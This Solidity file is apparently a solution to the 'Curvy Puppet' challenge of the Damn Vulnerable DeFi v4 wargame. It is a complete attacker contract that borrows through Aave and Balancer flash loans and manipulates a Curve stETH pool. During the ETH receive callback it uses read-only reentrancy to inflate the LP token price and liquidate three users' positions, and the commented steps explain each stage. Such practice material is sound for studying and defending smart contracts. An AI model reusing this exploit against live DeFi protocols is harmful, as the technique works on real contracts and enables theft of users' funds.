// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

interface ILendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

interface IVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external;
}

contract CurvyPuppetAttacker is IFlashLoanRecipient {
    IStableSwap curvePool;
    WETH weth;
    IERC20 stETH;
    CurvyPuppetLending lending;
    address[3] users;
    DamnValuableToken dvt;
    address treasury;

    // receive callback is called twice when exchange function called. Flag for prevent calling liqudation twice
    bool internal liquidated = false;
    // Landing amount should be thourghly calculated based on premium not exceeding treasury funds
    uint256 private constant aaveWethLoanAmount = 30000 * 1e18;
    uint256 private constant aavestETHLoanAmount = 172000 * 1e18;
    uint256 private constant balancerWethLoanAmount = 37900 * 1e18;

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;

    // balancer vault
    IVault private constant vault =
        IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    // aave pool
    address public constant LENDING_POOL =
        0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;

    IPermit2 permit2;

    constructor(
        IStableSwap _curvePool,
        WETH _weth,
        IERC20 _stETH,
        CurvyPuppetLending _lending,
        address[3] memory _users,
        IPermit2 _permit,
        DamnValuableToken _dvt,
        address _treasury
    ) {
        curvePool = _curvePool;
        weth = _weth;
        stETH = _stETH;
        lending = _lending;
        users = _users;
        permit2 = _permit;
        dvt = _dvt;
        treasury = _treasury;
    }

    function attack() external {
        // 1. take aave flash loan weth and stETH
        address[] memory assets = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        uint256[] memory modes = new uint256[](2);
        assets[0] = address(weth);
        assets[1] = address(stETH);
        amounts[0] = aaveWethLoanAmount;
        amounts[1] = aavestETHLoanAmount;
        modes[0] = 0;
        modes[1] = 0;

        ILendingPool(LENDING_POOL).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            "",
            0
        );

        // 9. send weth, lp tokens and Damn Valuable Token to treasury
        weth.transfer(treasury, weth.balanceOf(address(this)));
        IERC20(curvePool.lp_token()).transfer(
            treasury,
            IERC20(curvePool.lp_token()).balanceOf(address(this))
        );
        dvt.transfer(treasury, dvt.balanceOf(address(this)));
    }

    // balancer flash loan receiver
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        // 3. add liquidity to curve pool to get lp tokens in return
        weth.withdraw(weth.balanceOf(address(this)));

        stETH.approve(address(curvePool), type(uint256).max);
        curvePool.add_liquidity{value: address(this).balance}(
            [address(this).balance, stETH.balanceOf(address(this))],
            0
        );

        // 4. remove liquidity from curve pool burn lp tokens and get back weth
        // once receive (or fallback) function is called there's a chance of read-only re-entrancy attack
        curvePool.remove_liquidity(
            IERC20(curvePool.lp_token()).balanceOf(address(this)) - 4e18,
            [uint256(0), uint256(0)]
        );

        // 6. Repay Balancer Flash Loan with 0 fee
        weth.deposit{value: balancerWethLoanAmount}();

        IERC20(tokens[0]).transferFrom(
            address(this),
            address(vault),
            amounts[0] + feeAmounts[0]
        );
    }

    // aave flash loan receiver
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == LENDING_POOL, "Not Aave");
        require(initiator == address(this), "Invalid initiator");

        // 2. take balancer flash loan for extra weth inside aave flash loan receiver
        weth.withdraw(weth.balanceOf(address(this)));

        address[] memory token = new address[](1);
        token[0] = address(weth);
        uint256[] memory loan = new uint256[](1);
        loan[0] = balancerWethLoanAmount;

        vault.flashLoan(
            this,
            token,
            loan, // amount
            ""
        );

        // 7. calculate exact amount of ETH, stETH to repay aave flash loan and ETH to stETH in curve pool
        uint256 ETHAmount = 11514e18;

        stETH.approve(address(curvePool), ETHAmount);
        curvePool.exchange{value: ETHAmount}(
            0, // from ETH
            1, // to stETH
            ETHAmount,
            0 // min ETH out (or slippage-safe value)
        );

        // 8. repay aave flash loan
        weth.deposit{value: address(this).balance}();

        for (uint256 i = 0; i < assets.length; i++) {
            uint256 repayAmount = amounts[i] + premiums[i];
            IERC20(assets[i]).approve(LENDING_POOL, repayAmount);
        }
        return true;
    }

    receive() external payable {
        // 5. inside recive callback get_virtual_price output value is higher compair to outside of callback
        // since lp token value calculated as curve pool total value devide by lp tokens total value
        // at this moment total number of lp tokens has been decreased after burnfrom function
        // but total value of curve pool has not been recalculated which let the lp token value goes up
        if (msg.sender == address(curvePool) && !liquidated) {
            liquidated = true;

            IERC20(curvePool.lp_token()).approve(
                address(permit2),
                type(uint256).max
            );

            // approve doesn't work, should use permit2
            permit2.approve({
                token: address(curvePool.lp_token()),
                spender: address(lending),
                amount: type(uint160).max,
                expiration: uint48(block.timestamp + 3600)
            });

            for (uint i = 0; i < users.length; i++) {
                // Liquidate users position and get back DVT from the lending contract
                lending.liquidate(users[i]);
            }
        }
    }
}
